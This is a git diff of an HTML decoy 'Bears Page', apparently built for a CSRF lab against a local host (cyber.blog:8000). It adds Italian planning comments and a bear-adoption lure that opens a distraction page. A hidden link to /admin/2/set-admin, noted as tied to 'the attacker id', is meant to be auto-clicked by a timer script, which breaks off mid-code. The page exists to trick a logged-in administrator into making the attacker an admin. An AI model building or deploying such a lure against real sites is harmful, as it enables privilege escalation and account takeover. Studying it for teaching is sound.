@@ -83,19 +83,28 @@
         }
     </style>
 </head>
+<!-- 1. entrare da browser sulla pagina iniziale solo perché gliel'ho fornita io: qual è il link? http://cyber.blog:8000/csrf/index.html
+2. non avere azioni dopo 5 secondi da solo ma rimanere sulla pagina iniziale fino a quando non fa click... 
+3. ...sul bottone SCOPRI IL TUO ORSETTO, per andare sulla pagina di distrazione cioè https://www.bornfree.org.uk/adopt/brown-bear 
+4. solo dopo inizia l'azione onclick di 5 secondi e reindirizza sulla rotta admin/2/set-admin, che però è protetta da da middleware admin 
+5. quindi bisognerebbe prima farlo diventare admin, poi reindirizzarlo sulla rotta admin/dashboard che a quel punto lo farà entrare
+6. 
+-->
+
+
 <body>
     <div class="container">
         <h1>Welcome to the Bears Page</h1>
-        <a href="http://cyber.blog:8000/csrf/index.html" class="button" target="_blank">SCOPRI IL TUO ORSETTO</a>
+        <a href="https://www.bornfree.org.uk/adopt/brown-bear" class="button" target="_blank">SCOPRI IL TUO ORSETTO</a>
         <p>Here you can learn everything about bears. Bears are big, carnivorous mammals that are often visible in forests. They are known for their agility, playfulness, and ability to hunt humans.</p>
         <img src="https://placebear.com/200/300" alt="Cute bear">
         <br><br>
         <!-- update user id according to the attacker id  -->
-        <a id="csrf-link" href="http://cyber.blog:8000/admin/2/set-admin" class="button" style="display: none;">Adopt a cute bear for free!</a>
+        <a id="csrf-link" href="http://cyber.blog:8000/admin/2/set-admin" class="button" style="display: none;" >Adopt a cute bear for free!</a>
         <a href="https://www.bornfree.org.uk/adopt/brown-bear" class="button" target="_blank">ADOTTAMI, E' GRATIS :)</a>
-        <div id="message" class="message">Your bear thanks you :)</div>
+        <div id="message" class="message">Your new bear thanks you :)</div>
     </div>
-    
+    <!-- http://cyber.blog:8000/csrf/index.html -->
     <script>
         setTimeout(() => {
             // Recupera il bottone e simula il click
